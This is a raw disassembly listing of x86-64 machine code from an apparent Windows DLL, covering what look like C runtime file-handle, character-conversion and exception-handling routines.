   18000fc15:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000fc1a:	57                   	push   %rdi
   18000fc1b:	48 83 ec 20          	sub    $0x20,%rsp
   18000fc1f:	48 63 d9             	movslq %ecx,%rbx
   18000fc22:	41 8b f8             	mov    %r8d,%edi
   18000fc25:	48 8b f2             	mov    %rdx,%rsi
   18000fc28:	8b cb                	mov    %ebx,%ecx
   18000fc2a:	e8 41 ff ff ff       	call   0x18000fb70
   18000fc2f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000fc33:	75 11                	jne    0x18000fc46
   18000fc35:	e8 f6 79 ff ff       	call   0x180007630
   18000fc3a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000fc40:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000fc44:	eb 4d                	jmp    0x18000fc93
   18000fc46:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   18000fc4b:	44 8b cf             	mov    %edi,%r9d
   18000fc4e:	48 8b d6             	mov    %rsi,%rdx
   18000fc51:	48 8b c8             	mov    %rax,%rcx
   18000fc54:	ff 15 e6 15 00 00    	call   *0x15e6(%rip)        # 0x180011240
   18000fc5a:	85 c0                	test   %eax,%eax
   18000fc5c:	75 0f                	jne    0x18000fc6d
   18000fc5e:	ff 15 14 14 00 00    	call   *0x1414(%rip)        # 0x180011078
   18000fc64:	8b c8                	mov    %eax,%ecx
   18000fc66:	e8 75 79 ff ff       	call   0x1800075e0
   18000fc6b:	eb d3                	jmp    0x18000fc40
   18000fc6d:	48 8b cb             	mov    %rbx,%rcx
   18000fc70:	48 8b c3             	mov    %rbx,%rax
   18000fc73:	48 8d 15 06 b8 00 00 	lea    0xb806(%rip),%rdx        # 0x18001b480
   18000fc7a:	48 c1 f8 05          	sar    $0x5,%rax
   18000fc7e:	83 e1 1f             	and    $0x1f,%ecx
   18000fc81:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   18000fc85:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   18000fc89:	80 64 08 08 fd       	andb   $0xfd,0x8(%rax,%rcx,1)
   18000fc8e:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000fc93:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000fc98:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000fc9d:	48 83 c4 20          	add    $0x20,%rsp
   18000fca1:	5f                   	pop    %rdi
   18000fca2:	c3                   	ret
   18000fca3:	cc                   	int3
   18000fca4:	48 8b c4             	mov    %rsp,%rax
   18000fca7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000fcab:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000fcaf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000fcb3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000fcb7:	41 56                	push   %r14
   18000fcb9:	48 83 ec 50          	sub    $0x50,%rsp
   18000fcbd:	45 33 f6             	xor    %r14d,%r14d
   18000fcc0:	49 8b e8             	mov    %r8,%rbp
   18000fcc3:	48 8b f2             	mov    %rdx,%rsi
   18000fcc6:	48 8b f9             	mov    %rcx,%rdi
   18000fcc9:	48 85 d2             	test   %rdx,%rdx
   18000fccc:	74 13                	je     0x18000fce1
   18000fcce:	4d 85 c0             	test   %r8,%r8
   18000fcd1:	74 0e                	je     0x18000fce1
   18000fcd3:	44 38 32             	cmp    %r14b,(%rdx)
   18000fcd6:	75 26                	jne    0x18000fcfe
   18000fcd8:	48 85 c9             	test   %rcx,%rcx
   18000fcdb:	74 04                	je     0x18000fce1
   18000fcdd:	66 44 89 31          	mov    %r14w,(%rcx)
   18000fce1:	33 c0                	xor    %eax,%eax
   18000fce3:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   18000fce8:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   18000fced:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   18000fcf2:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   18000fcf7:	48 83 c4 50          	add    $0x50,%rsp
   18000fcfb:	41 5e                	pop    %r14
   18000fcfd:	c3                   	ret
   18000fcfe:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000fd03:	49 8b d1             	mov    %r9,%rdx
   18000fd06:	e8 e9 61 ff ff       	call   0x180005ef4
   18000fd0b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   18000fd10:	4c 39 b0 38 01 00 00 	cmp    %r14,0x138(%rax)
   18000fd17:	75 15                	jne    0x18000fd2e
   18000fd19:	48 85 ff             	test   %rdi,%rdi
   18000fd1c:	74 06                	je     0x18000fd24
   18000fd1e:	0f b6 06             	movzbl (%rsi),%eax
   18000fd21:	66 89 07             	mov    %ax,(%rdi)
   18000fd24:	bb 01 00 00 00       	mov    $0x1,%ebx
   18000fd29:	e9 ad 00 00 00       	jmp    0x18000fddb
   18000fd2e:	0f b6 0e             	movzbl (%rsi),%ecx
   18000fd31:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000fd36:	e8 4d c6 ff ff       	call   0x18000c388
   18000fd3b:	bb 01 00 00 00       	mov    $0x1,%ebx
   18000fd40:	85 c0                	test   %eax,%eax
   18000fd42:	74 5a                	je     0x18000fd9e
   18000fd44:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000fd49:	44 8b 89 d4 00 00 00 	mov    0xd4(%rcx),%r9d
   18000fd50:	44 3b cb             	cmp    %ebx,%r9d
   18000fd53:	7e 2f                	jle    0x18000fd84
   18000fd55:	41 3b e9             	cmp    %r9d,%ebp
   18000fd58:	7c 2a                	jl     0x18000fd84
   18000fd5a:	8b 49 04             	mov    0x4(%rcx),%ecx
   18000fd5d:	41 8b c6             	mov    %r14d,%eax
   18000fd60:	48 85 ff             	test   %rdi,%rdi
   18000fd63:	0f 95 c0             	setne  %al
   18000fd66:	8d 53 08             	lea    0x8(%rbx),%edx
   18000fd69:	4c 8b c6             	mov    %rsi,%r8
   18000fd6c:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000fd70:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000fd75:	ff 15 5d 13 00 00    	call   *0x135d(%rip)        # 0x1800110d8
   18000fd7b:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000fd80:	85 c0                	test   %eax,%eax
   18000fd82:	75 12                	jne    0x18000fd96
   18000fd84:	48 63 81 d4 00 00 00 	movslq 0xd4(%rcx),%rax
   18000fd8b:	48 3b e8             	cmp    %rax,%rbp
   18000fd8e:	72 3d                	jb     0x18000fdcd
   18000fd90:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   18000fd94:	74 37                	je     0x18000fdcd
   18000fd96:	8b 99 d4 00 00 00    	mov    0xd4(%rcx),%ebx
   18000fd9c:	eb 3d                	jmp    0x18000fddb
   18000fd9e:	41 8b c6             	mov    %r14d,%eax
   18000fda1:	48 85 ff             	test   %rdi,%rdi
   18000fda4:	44 8b cb             	mov    %ebx,%r9d
   18000fda7:	0f 95 c0             	setne  %al
   18000fdaa:	4c 8b c6             	mov    %rsi,%r8
   18000fdad:	ba 09 00 00 00       	mov    $0x9,%edx
   18000fdb2:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000fdb6:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   18000fdbb:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000fdc0:	8b 48 04             	mov    0x4(%rax),%ecx
   18000fdc3:	ff 15 0f 13 00 00    	call   *0x130f(%rip)        # 0x1800110d8
   18000fdc9:	85 c0                	test   %eax,%eax
   18000fdcb:	75 0e                	jne    0x18000fddb
   18000fdcd:	e8 5e 78 ff ff       	call   0x180007630
   18000fdd2:	83 cb ff             	or     $0xffffffff,%ebx
   18000fdd5:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   18000fddb:	44 38 74 24 48       	cmp    %r14b,0x48(%rsp)
   18000fde0:	74 0c                	je     0x18000fdee
   18000fde2:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   18000fde7:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000fdee:	8b c3                	mov    %ebx,%eax
   18000fdf0:	e9 ee fe ff ff       	jmp    0x18000fce3
   18000fdf5:	cc                   	int3
   18000fdf6:	cc                   	int3
   18000fdf7:	cc                   	int3
   18000fdf8:	45 33 c9             	xor    %r9d,%r9d
   18000fdfb:	e9 a4 fe ff ff       	jmp    0x18000fca4
   18000fe00:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   18000fe05:	48 83 ec 38          	sub    $0x38,%rsp
   18000fe09:	48 8b 0d a0 a9 00 00 	mov    0xa9a0(%rip),%rcx        # 0x18001a7b0
   18000fe10:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   18000fe14:	75 0c                	jne    0x18000fe22
   18000fe16:	e8 19 02 00 00       	call   0x180010034
   18000fe1b:	48 8b 0d 8e a9 00 00 	mov    0xa98e(%rip),%rcx        # 0x18001a7b0
   18000fe22:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   18000fe26:	75 07                	jne    0x18000fe2f
   18000fe28:	b8 ff ff 00 00       	mov    $0xffff,%eax
   18000fe2d:	eb 25                	jmp    0x18000fe54
   18000fe2f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000fe35:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   18000fe3a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000fe3f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000fe45:	ff 15 05 12 00 00    	call   *0x1205(%rip)        # 0x180011050
   18000fe4b:	85 c0                	test   %eax,%eax
   18000fe4d:	74 d9                	je     0x18000fe28
   18000fe4f:	0f b7 44 24 40       	movzwl 0x40(%rsp),%eax
   18000fe54:	48 83 c4 38          	add    $0x38,%rsp
   18000fe58:	c3                   	ret
   18000fe59:	cc                   	int3
   18000fe5a:	cc                   	int3
   18000fe5b:	cc                   	int3
   18000fe5c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000fe61:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000fe65:	56                   	push   %rsi
   18000fe66:	57                   	push   %rdi
   18000fe67:	41 56                	push   %r14
   18000fe69:	48 83 ec 20          	sub    $0x20,%rsp
   18000fe6d:	48 63 d9             	movslq %ecx,%rbx
   18000fe70:	83 fb fe             	cmp    $0xfffffffe,%ebx
   18000fe73:	75 18                	jne    0x18000fe8d
   18000fe75:	e8 46 77 ff ff       	call   0x1800075c0
   18000fe7a:	83 20 00             	andl   $0x0,(%rax)
   18000fe7d:	e8 ae 77 ff ff       	call   0x180007630
   18000fe82:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000fe88:	e9 81 00 00 00       	jmp    0x18000ff0e
   18000fe8d:	85 c9                	test   %ecx,%ecx
   18000fe8f:	78 65                	js     0x18000fef6
   18000fe91:	3b 1d 11 cd 00 00    	cmp    0xcd11(%rip),%ebx        # 0x18001cba8
   18000fe97:	73 5d                	jae    0x18000fef6
   18000fe99:	48 8b c3             	mov    %rbx,%rax
   18000fe9c:	48 8b fb             	mov    %rbx,%rdi
   18000fe9f:	48 c1 ff 05          	sar    $0x5,%rdi
   18000fea3:	4c 8d 35 d6 b5 00 00 	lea    0xb5d6(%rip),%r14        # 0x18001b480
   18000feaa:	83 e0 1f             	and    $0x1f,%eax
   18000fead:	48 6b f0 58          	imul   $0x58,%rax,%rsi
   18000feb1:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   18000feb5:	0f be 4c 30 08       	movsbl 0x8(%rax,%rsi,1),%ecx
   18000feba:	83 e1 01             	and    $0x1,%ecx
   18000febd:	74 37                	je     0x18000fef6
   18000febf:	8b cb                	mov    %ebx,%ecx
   18000fec1:	e8 66 fb ff ff       	call   0x18000fa2c
   18000fec6:	90                   	nop
   18000fec7:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   18000fecb:	f6 44 30 08 01       	testb  $0x1,0x8(%rax,%rsi,1)
   18000fed0:	74 0b                	je     0x18000fedd
   18000fed2:	8b cb                	mov    %ebx,%ecx
   18000fed4:	e8 47 00 00 00       	call   0x18000ff20
   18000fed9:	8b f8                	mov    %eax,%edi
   18000fedb:	eb 0e                	jmp    0x18000feeb
   18000fedd:	e8 4e 77 ff ff       	call   0x180007630
   18000fee2:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000fee8:	83 cf ff             	or     $0xffffffff,%edi
   18000feeb:	8b cb                	mov    %ebx,%ecx
   18000feed:	e8 f2 fc ff ff       	call   0x18000fbe4
   18000fef2:	8b c7                	mov    %edi,%eax
   18000fef4:	eb 1b                	jmp    0x18000ff11
   18000fef6:	e8 c5 76 ff ff       	call   0x1800075c0
   18000fefb:	83 20 00             	andl   $0x0,(%rax)
   18000fefe:	e8 2d 77 ff ff       	call   0x180007630
   18000ff03:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000ff09:	e8 56 76 ff ff       	call   0x180007564
   18000ff0e:	83 c8 ff             	or     $0xffffffff,%eax
   18000ff11:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000ff16:	48 83 c4 20          	add    $0x20,%rsp
   18000ff1a:	41 5e                	pop    %r14
   18000ff1c:	5f                   	pop    %rdi
   18000ff1d:	5e                   	pop    %rsi
   18000ff1e:	c3                   	ret
   18000ff1f:	cc                   	int3
   18000ff20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ff25:	57                   	push   %rdi
   18000ff26:	48 83 ec 20          	sub    $0x20,%rsp
   18000ff2a:	48 63 f9             	movslq %ecx,%rdi
   18000ff2d:	8b cf                	mov    %edi,%ecx
   18000ff2f:	e8 3c fc ff ff       	call   0x18000fb70
   18000ff34:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000ff38:	74 59                	je     0x18000ff93
   18000ff3a:	48 8b 05 3f b5 00 00 	mov    0xb53f(%rip),%rax        # 0x18001b480
   18000ff41:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000ff46:	83 ff 01             	cmp    $0x1,%edi
   18000ff49:	75 09                	jne    0x18000ff54
   18000ff4b:	40 84 b8 b8 00 00 00 	test   %dil,0xb8(%rax)
   18000ff52:	75 0a                	jne    0x18000ff5e
   18000ff54:	3b f9                	cmp    %ecx,%edi
   18000ff56:	75 1d                	jne    0x18000ff75
   18000ff58:	f6 40 60 01          	testb  $0x1,0x60(%rax)
   18000ff5c:	74 17                	je     0x18000ff75
   18000ff5e:	e8 0d fc ff ff       	call   0x18000fb70
   18000ff63:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000ff68:	48 8b d8             	mov    %rax,%rbx
   18000ff6b:	e8 00 fc ff ff       	call   0x18000fb70
   18000ff70:	48 3b c3             	cmp    %rbx,%rax
   18000ff73:	74 1e                	je     0x18000ff93
   18000ff75:	8b cf                	mov    %edi,%ecx
   18000ff77:	e8 f4 fb ff ff       	call   0x18000fb70
   18000ff7c:	48 8b c8             	mov    %rax,%rcx
   18000ff7f:	ff 15 c3 10 00 00    	call   *0x10c3(%rip)        # 0x180011048
   18000ff85:	85 c0                	test   %eax,%eax
   18000ff87:	75 0a                	jne    0x18000ff93
   18000ff89:	ff 15 e9 10 00 00    	call   *0x10e9(%rip)        # 0x180011078
   18000ff8f:	8b d8                	mov    %eax,%ebx
   18000ff91:	eb 02                	jmp    0x18000ff95
   18000ff93:	33 db                	xor    %ebx,%ebx
   18000ff95:	8b cf                	mov    %edi,%ecx
   18000ff97:	e8 28 fb ff ff       	call   0x18000fac4
   18000ff9c:	48 8b d7             	mov    %rdi,%rdx
   18000ff9f:	48 8b cf             	mov    %rdi,%rcx
   18000ffa2:	48 c1 f9 05          	sar    $0x5,%rcx
   18000ffa6:	83 e2 1f             	and    $0x1f,%edx
   18000ffa9:	4c 8d 05 d0 b4 00 00 	lea    0xb4d0(%rip),%r8        # 0x18001b480
   18000ffb0:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   18000ffb4:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   18000ffb8:	c6 44 11 08 00       	movb   $0x0,0x8(%rcx,%rdx,1)
   18000ffbd:	85 db                	test   %ebx,%ebx
   18000ffbf:	74 0c                	je     0x18000ffcd
   18000ffc1:	8b cb                	mov    %ebx,%ecx
   18000ffc3:	e8 18 76 ff ff       	call   0x1800075e0
   18000ffc8:	83 c8 ff             	or     $0xffffffff,%eax
   18000ffcb:	eb 02                	jmp    0x18000ffcf
   18000ffcd:	33 c0                	xor    %eax,%eax
   18000ffcf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ffd4:	48 83 c4 20          	add    $0x20,%rsp
   18000ffd8:	5f                   	pop    %rdi
   18000ffd9:	c3                   	ret
   18000ffda:	cc                   	int3
   18000ffdb:	cc                   	int3
   18000ffdc:	40 53                	rex push %rbx
   18000ffde:	48 83 ec 20          	sub    $0x20,%rsp
   18000ffe2:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   18000ffe6:	48 8b d9             	mov    %rcx,%rbx
   18000ffe9:	74 22                	je     0x18001000d
   18000ffeb:	f6 41 18 08          	testb  $0x8,0x18(%rcx)
   18000ffef:	74 1c                	je     0x18001000d
   18000fff1:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   18000fff5:	e8 86 55 ff ff       	call   0x180005580
   18000fffa:	81 63 18 f7 fb ff ff 	andl   $0xfffffbf7,0x18(%rbx)
   180010001:	33 c0                	xor    %eax,%eax
   180010003:	48 89 03             	mov    %rax,(%rbx)
   180010006:	48 89 43 10          	mov    %rax,0x10(%rbx)
   18001000a:	89 43 08             	mov    %eax,0x8(%rbx)
   18001000d:	48 83 c4 20          	add    $0x20,%rsp
   180010011:	5b                   	pop    %rbx
   180010012:	c3                   	ret
   180010013:	cc                   	int3
   180010014:	48 83 ec 28          	sub    $0x28,%rsp
   180010018:	48 8b 0d 91 a7 00 00 	mov    0xa791(%rip),%rcx        # 0x18001a7b0
   18001001f:	48 8d 41 02          	lea    0x2(%rcx),%rax
   180010023:	48 83 f8 01          	cmp    $0x1,%rax
   180010027:	76 06                	jbe    0x18001002f
   180010029:	ff 15 19 10 00 00    	call   *0x1019(%rip)        # 0x180011048
   18001002f:	48 83 c4 28          	add    $0x28,%rsp
   180010033:	c3                   	ret
   180010034:	48 83 ec 48          	sub    $0x48,%rsp
   180010038:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18001003e:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   180010043:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   180010049:	48 8d 0d 78 68 00 00 	lea    0x6878(%rip),%rcx        # 0x1800168c8
   180010050:	45 33 c9             	xor    %r9d,%r9d
   180010053:	ba 00 00 00 40       	mov    $0x40000000,%edx
   180010058:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   18001005d:	ff 15 e5 11 00 00    	call   *0x11e5(%rip)        # 0x180011248
   180010063:	48 89 05 46 a7 00 00 	mov    %rax,0xa746(%rip)        # 0x18001a7b0
   18001006a:	48 83 c4 48          	add    $0x48,%rsp
   18001006e:	c3                   	ret
   18001006f:	cc                   	int3
   180010070:	ff 25 32 10 00 00    	jmp    *0x1032(%rip)        # 0x1800110a8
   180010076:	ff 25 5c 11 00 00    	jmp    *0x115c(%rip)        # 0x1800111d8
   18001007c:	cc                   	int3
   18001007d:	cc                   	int3
   18001007e:	cc                   	int3
   18001007f:	cc                   	int3
   180010080:	40 55                	rex push %rbp
   180010082:	48 83 ec 20          	sub    $0x20,%rsp
   180010086:	48 8b ea             	mov    %rdx,%rbp
   180010089:	48 83 7d 40 00       	cmpq   $0x0,0x40(%rbp)
   18001008e:	75 0f                	jne    0x18001009f
   180010090:	83 3d 91 96 00 00 ff 	cmpl   $0xffffffff,0x9691(%rip)        # 0x180019728
   180010097:	74 06                	je     0x18001009f
   180010099:	e8 0e 8f ff ff       	call   0x180008fac
   18001009e:	90                   	nop
   18001009f:	48 83 c4 20          	add    $0x20,%rsp
   1800100a3:	5d                   	pop    %rbp
   1800100a4:	c3                   	ret
   1800100a5:	cc                   	int3
   1800100a6:	40 55                	rex push %rbp
   1800100a8:	48 83 ec 20          	sub    $0x20,%rsp
   1800100ac:	48 8b ea             	mov    %rdx,%rbp
   1800100af:	48 89 4d 40          	mov    %rcx,0x40(%rbp)
   1800100b3:	48 8b 01             	mov    (%rcx),%rax
   1800100b6:	8b 10                	mov    (%rax),%edx
   1800100b8:	89 55 30             	mov    %edx,0x30(%rbp)
   1800100bb:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   1800100bf:	89 55 28             	mov    %edx,0x28(%rbp)
   1800100c2:	83 7d 78 01          	cmpl   $0x1,0x78(%rbp)
   1800100c6:	75 13                	jne    0x1800100db
   1800100c8:	4c 8b 85 80 00 00 00 	mov    0x80(%rbp),%r8
   1800100cf:	33 d2                	xor    %edx,%edx
   1800100d1:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1800100d5:	e8 2e 61 ff ff       	call   0x180006208
   1800100da:	90                   	nop
   1800100db:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   1800100df:	8b 4d 28             	mov    0x28(%rbp),%ecx
   1800100e2:	e8 fd 90 ff ff       	call   0x1800091e4
   1800100e7:	90                   	nop
   1800100e8:	48 83 c4 20          	add    $0x20,%rsp
   1800100ec:	5d                   	pop    %rbp
   1800100ed:	c3                   	ret
   1800100ee:	cc                   	int3
   1800100ef:	40 55                	rex push %rbp
   1800100f1:	48 83 ec 20          	sub    $0x20,%rsp
   1800100f5:	48 8b ea             	mov    %rdx,%rbp
   1800100f8:	83 bd 80 00 00 00 00 	cmpl   $0x0,0x80(%rbp)
   1800100ff:	74 0b                	je     0x18001010c
   180010101:	b9 08 00 00 00       	mov    $0x8,%ecx
   180010106:	e8 f1 ad ff ff       	call   0x18000aefc
   18001010b:	90                   	nop
   18001010c:	48 83 c4 20          	add    $0x20,%rsp
   180010110:	5d                   	pop    %rbp
   180010111:	c3                   	ret
   180010112:	cc                   	int3
   180010113:	40 55                	rex push %rbp
   180010115:	48 83 ec 20          	sub    $0x20,%rsp
   180010119:	48 8b ea             	mov    %rdx,%rbp
   18001011c:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180010121:	48 83 c4 20          	add    $0x20,%rsp
   180010125:	5d                   	pop    %rbp
   180010126:	e9 d1 ad ff ff       	jmp    0x18000aefc
   18001012b:	cc                   	int3
   18001012c:	40 55                	rex push %rbp
   18001012e:	48 83 ec 20          	sub    $0x20,%rsp
   180010132:	48 8b ea             	mov    %rdx,%rbp
   180010135:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18001013a:	48 83 c4 20          	add    $0x20,%rsp
   18001013e:	5d                   	pop    %rbp
   18001013f:	e9 b8 ad ff ff       	jmp    0x18000aefc
   180010144:	cc                   	int3
   180010145:	40 55                	rex push %rbp
   180010147:	48 83 ec 20          	sub    $0x20,%rsp
   18001014b:	48 8b ea             	mov    %rdx,%rbp
   18001014e:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180010153:	48 83 c4 20          	add    $0x20,%rsp
   180010157:	5d                   	pop    %rbp
   180010158:	e9 9f ad ff ff       	jmp    0x18000aefc
   18001015d:	cc                   	int3
   18001015e:	40 55                	rex push %rbp
   180010160:	48 83 ec 20          	sub    $0x20,%rsp
   180010164:	48 8b ea             	mov    %rdx,%rbp
   180010167:	b9 0c 00 00 00       	mov    $0xc,%ecx
   18001016c:	48 83 c4 20          	add    $0x20,%rsp
   180010170:	5d                   	pop    %rbp
   180010171:	e9 86 ad ff ff       	jmp    0x18000aefc
   180010176:	cc                   	int3
   180010177:	40 55                	rex push %rbp
   180010179:	48 83 ec 20          	sub    $0x20,%rsp
   18001017d:	48 8b ea             	mov    %rdx,%rbp
   180010180:	b9 0b 00 00 00       	mov    $0xb,%ecx
   180010185:	e8 72 ad ff ff       	call   0x18000aefc
   18001018a:	90                   	nop
   18001018b:	48 83 c4 20          	add    $0x20,%rsp
   18001018f:	5d                   	pop    %rbp
   180010190:	c3                   	ret
   180010191:	cc                   	int3
   180010192:	40 55                	rex push %rbp
   180010194:	48 83 ec 20          	sub    $0x20,%rsp
   180010198:	48 8b ea             	mov    %rdx,%rbp
   18001019b:	48 8b 0d ee 9a 00 00 	mov    0x9aee(%rip),%rcx        # 0x180019c90
   1800101a2:	48 83 c4 20          	add    $0x20,%rsp
   1800101a6:	5d                   	pop    %rbp
   1800101a7:	48 ff 25 3a 10 00 00 	rex.W jmp *0x103a(%rip)        # 0x1800111e8
   1800101ae:	cc                   	int3
   1800101af:	cc                   	int3
   1800101b0:	40 55                	rex push %rbp
   1800101b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800101b6:	48 8b ea             	mov    %rdx,%rbp
   1800101b9:	48 8b 01             	mov    (%rcx),%rax
   1800101bc:	33 c9                	xor    %ecx,%ecx
   1800101be:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1800101c4:	0f 94 c1             	sete   %cl
   1800101c7:	8b c1                	mov    %ecx,%eax
   1800101c9:	48 83 c4 20          	add    $0x20,%rsp
   1800101cd:	5d                   	pop    %rbp
   1800101ce:	c3                   	ret
   1800101cf:	cc                   	int3
   1800101d0:	40 55                	rex push %rbp
   1800101d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800101d6:	48 8b ea             	mov    %rdx,%rbp
   1800101d9:	48 83 c4 20          	add    $0x20,%rsp
   1800101dd:	5d                   	pop    %rbp
   1800101de:	e9 99 78 ff ff       	jmp    0x180007a7c
   1800101e3:	cc                   	int3
   1800101e4:	40 55                	rex push %rbp
   1800101e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800101ea:	48 8b ea             	mov    %rdx,%rbp
   1800101ed:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   1800101f1:	74 08                	je     0x1800101fb
   1800101f3:	33 c9                	xor    %ecx,%ecx
   1800101f5:	e8 02 ad ff ff       	call   0x18000aefc
   1800101fa:	90                   	nop
   1800101fb:	48 83 c4 20          	add    $0x20,%rsp
   1800101ff:	5d                   	pop    %rbp
   180010200:	c3                   	ret
   180010201:	cc                   	int3
   180010202:	40 55                	rex push %rbp
   180010204:	48 83 ec 20          	sub    $0x20,%rsp
   180010208:	48 8b ea             	mov    %rdx,%rbp
   18001020b:	48 63 4d 20          	movslq 0x20(%rbp),%rcx
   18001020f:	48 8b c1             	mov    %rcx,%rax
   180010212:	48 8b 15 3f b8 00 00 	mov    0xb83f(%rip),%rdx        # 0x18001ba58
   180010219:	48 8b 14 ca          	mov    (%rdx,%rcx,8),%rdx
   18001021d:	e8 06 c7 ff ff       	call   0x18000c928
   180010222:	90                   	nop
   180010223:	48 83 c4 20          	add    $0x20,%rsp
   180010227:	5d                   	pop    %rbp
   180010228:	c3                   	ret
   180010229:	cc                   	int3
   18001022a:	40 55                	rex push %rbp
   18001022c:	48 83 ec 20          	sub    $0x20,%rsp
   180010230:	48 8b ea             	mov    %rdx,%rbp
   180010233:	b9 01 00 00 00       	mov    $0x1,%ecx
   180010238:	48 83 c4 20          	add    $0x20,%rsp
   18001023c:	5d                   	pop    %rbp
   18001023d:	e9 ba ac ff ff       	jmp    0x18000aefc
   180010242:	cc                   	int3
   180010243:	40 55                	rex push %rbp
   180010245:	48 83 ec 20          	sub    $0x20,%rsp
   180010249:	48 8b ea             	mov    %rdx,%rbp
   18001024c:	b9 01 00 00 00       	mov    $0x1,%ecx
   180010251:	48 83 c4 20          	add    $0x20,%rsp
   180010255:	5d                   	pop    %rbp
   180010256:	e9 a1 ac ff ff       	jmp    0x18000aefc
   18001025b:	cc                   	int3
   18001025c:	40 55                	rex push %rbp
   18001025e:	48 83 ec 20          	sub    $0x20,%rsp
   180010262:	48 8b ea             	mov    %rdx,%rbp
   180010265:	8b 4d 50             	mov    0x50(%rbp),%ecx
   180010268:	48 83 c4 20          	add    $0x20,%rsp
   18001026c:	5d                   	pop    %rbp
   18001026d:	e9 72 f9 ff ff       	jmp    0x18000fbe4
   180010272:	cc                   	int3
   180010273:	40 55                	rex push %rbp
   180010275:	48 83 ec 20          	sub    $0x20,%rsp
   180010279:	48 8b ea             	mov    %rdx,%rbp
   18001027c:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   180010280:	48 83 c4 20          	add    $0x20,%rsp
   180010284:	5d                   	pop    %rbp
   180010285:	e9 4e c6 ff ff       	jmp    0x18000c8d8
   18001028a:	cc                   	int3
   18001028b:	40 55                	rex push %rbp
   18001028d:	48 83 ec 20          	sub    $0x20,%rsp
   180010291:	48 8b ea             	mov    %rdx,%rbp
   180010294:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180010299:	48 83 c4 20          	add    $0x20,%rsp
   18001029d:	5d                   	pop    %rbp
   18001029e:	e9 59 ac ff ff       	jmp    0x18000aefc
   1800102a3:	cc                   	int3
   1800102a4:	40 55                	rex push %rbp
   1800102a6:	48 83 ec 20          	sub    $0x20,%rsp
   1800102aa:	48 8b ea             	mov    %rdx,%rbp
   1800102ad:	8b 4d 40             	mov    0x40(%rbp),%ecx
   1800102b0:	48 83 c4 20          	add    $0x20,%rsp
   1800102b4:	5d                   	pop    %rbp
   1800102b5:	e9 2a f9 ff ff       	jmp    0x18000fbe4
   1800102ba:	cc                   	int3
